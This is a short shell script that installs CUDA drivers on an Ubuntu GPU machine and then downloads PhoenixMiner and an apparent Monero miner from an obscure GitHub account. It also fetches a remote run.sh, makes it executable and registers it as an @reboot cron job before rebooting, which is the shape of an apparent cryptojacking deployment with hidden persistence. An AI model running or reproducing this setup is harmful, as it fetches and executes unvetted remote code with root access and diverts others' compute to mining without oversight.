#!/bin/sh
sudo apt-get update
sudo apt-get upgrade -y
sudo apt-get install -y tmux
CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.2.89-1_amd64.deb
wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG} 
sudo dpkg -i /tmp/${CUDA_REPO_PKG}
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub 
rm -f /tmp/${CUDA_REPO_PKG}
sudo apt-get update
sudo apt-get install cuda-drivers -y
wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
tar -zxvf winxmr.tar.gz
wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
tar xzf PhoenixMiner_5.6d_Linux.tar.gz
wget https://raw.githubusercontent.com/vnxxx/vnn2021/main/run.sh
chmod a+x+w run.sh
echo "@reboot sh run.sh">> resmi
crontab resmi
sudo rm resmi
sudo reboot
